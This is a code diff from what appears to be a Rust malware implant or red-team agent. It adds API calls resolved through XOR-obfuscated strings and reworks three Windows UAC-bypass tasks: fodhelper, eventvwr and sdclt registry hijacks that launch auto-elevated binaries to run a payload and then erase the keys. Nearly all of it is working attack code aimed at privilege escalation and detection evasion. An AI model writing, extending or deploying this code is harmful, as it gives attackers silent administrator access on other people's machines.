@@ -58,20 +58,108 @@ unsafe fn adv_fn(base: usize, enc: &[u8]) -> Option<*const u8> {
 }
 
 #[cfg(target_os = "windows")]
-fn shell_execute_w(op: *const u16, file: *const u16) -> usize {
-    // "shell32.dll\0" XOR 0x5A
-    let shell32 = crate::loader::get_module_base(
-        crate::obfs::dec(&[0x29,0x32,0x3F,0x36,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
-    );
-    if shell32 == 0 { return 0; }
-    // "ShellExecuteW\0" XOR 0x5A
-    let fn_ptr = unsafe { crate::loader::get_export_by_name(shell32,
-        crate::obfs::dec(&[0x09,0x32,0x3F,0x36,0x36,0x1F,0x22,0x3F,0x39,0x2F,0x2E,0x3F,0x0D,0x5A]).as_ptr())
+fn create_process_system32(exe_name: &str) -> Result<(), u32> {
+    let k32 = k32_base();
+    if k32 == 0 { return Err(0xDEAD0001); }
+
+    // "CreateProcessW\0" XOR 0x5A
+    let p_cp = unsafe { crate::loader::get_export_by_name(k32,
+        crate::obfs::dec(&[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x0D,0x5A]).as_ptr()) };
+    // "CloseHandle\0" XOR 0x5A
+    let p_cl = unsafe { crate::loader::get_export_by_name(k32,
+        crate::obfs::dec(&[0x19,0x36,0x35,0x29,0x3F,0x12,0x3B,0x34,0x3E,0x36,0x3F,0x5A]).as_ptr()) };
+    // "GetLastError\0" XOR 0x5A
+    let p_gle = unsafe { crate::loader::get_export_by_name(k32,
+        crate::obfs::dec(&[0x1D,0x3F,0x2E,0x16,0x3B,0x29,0x2E,0x1F,0x28,0x28,0x35,0x28,0x5A]).as_ptr()) };
+
+    type CreateProcessWFn = unsafe extern "system" fn(*const u16, *mut u16, *const u8, *const u8, i32, u32, *const u8, *const u16, *const u8, *mut u8) -> i32;
+    type CloseHandleFn    = unsafe extern "system" fn(isize) -> i32;
+    type GetLastErrorFn   = unsafe extern "system" fn() -> u32;
+
+    let fn_cp: CreateProcessWFn = match p_cp { Some(p) => unsafe { core::mem::transmute(p) }, None => return Err(0xDEAD0002) };
+    let fn_cl: Option<CloseHandleFn> = p_cl.map(|p| unsafe { core::mem::transmute(p) });
+    let fn_gle: Option<GetLastErrorFn> = p_gle.map(|p| unsafe { core::mem::transmute(p) });
+
+    let windir = std::env::var("WINDIR").unwrap_or_else(|_| "C:\\Windows".into());
+    let path: Vec<u16> = format!("{windir}\\System32\\{exe_name}").encode_utf16().chain(core::iter::once(0)).collect();
+
+    // STARTUPINFOW: 104 bytes; set cb = 104 at offset 0, rest zeroed
+    let mut si = [0u8; 104];
+    si[0..4].copy_from_slice(&104u32.to_le_bytes());
+    let mut pi = [0u8; 24];
+
+    let ret = unsafe { fn_cp(path.as_ptr(), core::ptr::null_mut(), core::ptr::null(), core::ptr::null(), 0, 0, core::ptr::null(), core::ptr::null(), si.as_ptr(), pi.as_mut_ptr()) };
+
+    if ret != 0 {
+        if let Some(close) = fn_cl {
+            let hp = isize::from_le_bytes(pi[0..8].try_into().unwrap_or([0;8]));
+            let ht = isize::from_le_bytes(pi[8..16].try_into().unwrap_or([0;8]));
+            if hp != 0 && hp != -1 { unsafe { close(hp); } }
+            if ht != 0 && ht != -1 { unsafe { close(ht); } }
+        }
+        Ok(())
+    } else {
+        let err = fn_gle.map(|f| unsafe { f() }).unwrap_or(0xFFFFFFFF);
+        Err(err)
+    }
+}
+
+// Launch a System32 binary via ShellExecuteExW (routes through elevation service
+// for auto-elevate binaries — CreateProcessW returns ERROR_ELEVATION_REQUIRED for those).
+// "shell32.dll\0" XOR 0x5A = [0x29,0x32,0x3F,0x36,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]
+// "ShellExecuteExW\0" XOR 0x5A = [0x09,0x32,0x3F,0x36,0x36,0x1F,0x22,0x3F,0x39,0x2F,0x2E,0x3F,0x1F,0x22,0x0D,0x5A]
+#[cfg(target_os = "windows")]
+fn shell_execute_ex_system32(exe_name: &str) -> Result<(), u32> {
+    let windir = std::env::var("WINDIR").unwrap_or_else(|_| "C:\\Windows".into());
+    let path: Vec<u16> = format!("{windir}\\System32\\{exe_name}").encode_utf16().chain(core::iter::once(0)).collect();
+
+    let shell32_name = crate::obfs::dec(&[0x29,0x32,0x3F,0x36,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
+    let shell32 = {
+        use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
+        let b = crate::loader::get_module_base(shell32_name.as_ptr());
+        if b != 0 { b } else { unsafe { LoadLibraryA(shell32_name.as_ptr()) as usize } }
     };
-    let fn_ptr = match fn_ptr { Some(p) => p, None => return 0 };
-    type ShellExecuteWFn = unsafe extern "system" fn(isize, *const u16, *const u16, *const u16, *const u16, i32) -> isize;
-    let f: ShellExecuteWFn = unsafe { core::mem::transmute(fn_ptr) };
-    unsafe { f(0, op, file, core::ptr::null(), core::ptr::null(), 1) as usize }
+    if shell32 == 0 { return Err(0xDEAD0010); }
+
+    let p_sex = unsafe { crate::loader::get_export_by_name(shell32,
+        crate::obfs::dec(&[0x09,0x32,0x3F,0x36,0x36,0x1F,0x22,0x3F,0x39,0x2F,0x2E,0x3F,0x1F,0x22,0x0D,0x5A]).as_ptr()) };
+    let fn_sex = match p_sex {
+        Some(p) => unsafe { core::mem::transmute::<*const u8, unsafe extern "system" fn(*mut u8) -> i32>(p) },
+        None    => return Err(0xDEAD0011),
+    };
+
+    // SHELLEXECUTEINFOW layout (64-bit, 112 bytes total):
+    // +0  cbSize   DWORD  4
+    // +4  fMask    ULONG  4
+    // +8  hwnd     HWND   8
+    // +16 lpVerb   *u16   8  (NULL = default verb)
+    // +24 lpFile   *u16   8
+    // +32 lpParam  *u16   8  (NULL)
+    // +40 lpDir    *u16   8  (NULL)
+    // +48 nShow    INT    4
+    // +52 pad      4
+    // +56 hInstApp HINST  8
+    // rest 0
+    let mut sei = [0u8; 112];
+    sei[0..4].copy_from_slice(&112u32.to_le_bytes());
+    // SEE_MASK_FLAG_NO_UI = 0x0400 (suppress error dialogs)
+    sei[4..8].copy_from_slice(&0x0400u32.to_le_bytes());
+    let p_file = path.as_ptr() as u64;
+    sei[24..32].copy_from_slice(&p_file.to_le_bytes());
+    // nShow = SW_SHOW = 5
+    sei[48..52].copy_from_slice(&5i32.to_le_bytes());
+
+    let ret = unsafe { fn_sex(sei.as_mut_ptr()) };
+    if ret != 0 {
+        Ok(())
+    } else {
+        let k32 = k32_base();
+        let p_gle = unsafe { crate::loader::get_export_by_name(k32,
+            crate::obfs::dec(&[0x1D,0x3F,0x2E,0x16,0x3B,0x29,0x2E,0x1F,0x28,0x28,0x35,0x28,0x5A]).as_ptr()) };
+        type GetLastErrorFn = unsafe extern "system" fn() -> u32;
+        let err = p_gle.map(|p| unsafe { (core::mem::transmute::<_, GetLastErrorFn>(p))() }).unwrap_or(0xFFFF);
+        Err(err)
+    }
 }
 
 #[cfg(target_os = "windows")]
@@ -395,19 +483,13 @@ fn uac_fodhelper(v: &serde_json::Value) -> TaskOutput {
         return TaskOutput::failure(&format!("uac-fodhelper: reg write failed: {e}"));
     }
 
-    // Launch fodhelper.exe — no UAC prompt since it's auto-elevated
-    let op:   Vec<u16> = "open\0".encode_utf16().collect();
-    let file: Vec<u16> = "fodhelper.exe\0".encode_utf16().collect();
-    let ret = shell_execute_w(op.as_ptr(), file.as_ptr());
-
-    // Wait briefly then clean up registry
+    let result = shell_execute_ex_system32("fodhelper.exe");
     std::thread::sleep(std::time::Duration::from_millis(2500));
     reg_delete_uac_key();
 
-    if ret as usize > 32 {
-        TaskOutput::success(b"uac-fodhelper: payload launched".to_vec())
-    } else {
-        TaskOutput::failure("uac-fodhelper: ShellExecuteW failed")
+    match result {
+        Ok(()) => TaskOutput::success(b"uac-fodhelper: payload launched".to_vec()),
+        Err(e)  => TaskOutput::failure(&format!("uac-fodhelper: ShellExecuteExW failed err={e:#010x}")),
     }
 }
 
@@ -423,17 +505,13 @@ fn uac_eventvwr(v: &serde_json::Value) -> TaskOutput {
         return TaskOutput::failure(&format!("uac-eventvwr: {e}"));
     }
 
-    std::thread::sleep(std::time::Duration::from_millis(2500));
+    let result = shell_execute_ex_system32("eventvwr.exe");
+    std::thread::sleep(std::time::Duration::from_millis(3000));
     reg_delete_mscfile_key();
 
-    let op:   Vec<u16> = "open\0".encode_utf16().collect();
-    let file: Vec<u16> = "eventvwr.exe\0".encode_utf16().collect();
-    let ret = shell_execute_w(op.as_ptr(), file.as_ptr());
-
-    if ret > 32 {
-        TaskOutput::success(b"uac-eventvwr: payload launched".to_vec())
-    } else {
-        TaskOutput::failure("uac-eventvwr: ShellExecuteW failed")
+    match result {
+        Ok(()) => TaskOutput::success(b"uac-eventvwr: payload launched".to_vec()),
+        Err(e)  => TaskOutput::failure(&format!("uac-eventvwr: ShellExecuteExW failed err={e:#010x}")),
     }
 }
 
@@ -662,17 +740,13 @@ fn uac_sdclt(v: &serde_json::Value) -> TaskOutput {
         return TaskOutput::failure(&format!("uac-sdclt: reg write failed: {e}"));
     }
 
-    let op:   Vec<u16> = "open\0".encode_utf16().collect();
-    let file: Vec<u16> = "sdclt.exe\0".encode_utf16().collect();
-    let ret = shell_execute_w(op.as_ptr(), file.as_ptr());
-
+    let result = shell_execute_ex_system32("sdclt.exe");
     std::thread::sleep(std::time::Duration::from_millis(3000));
     reg_delete_key(subkey);
 
-    if ret > 32 {
-        TaskOutput::success(b"uac-sdclt: payload launched".to_vec())
-    } else {
-        TaskOutput::failure("uac-sdclt: ShellExecuteW failed")
+    match result {
+        Ok(()) => TaskOutput::success(b"uac-sdclt: payload launched".to_vec()),
+        Err(e)  => TaskOutput::failure(&format!("uac-sdclt: ShellExecuteExW failed err={e:#010x}")),
     }
 }
 
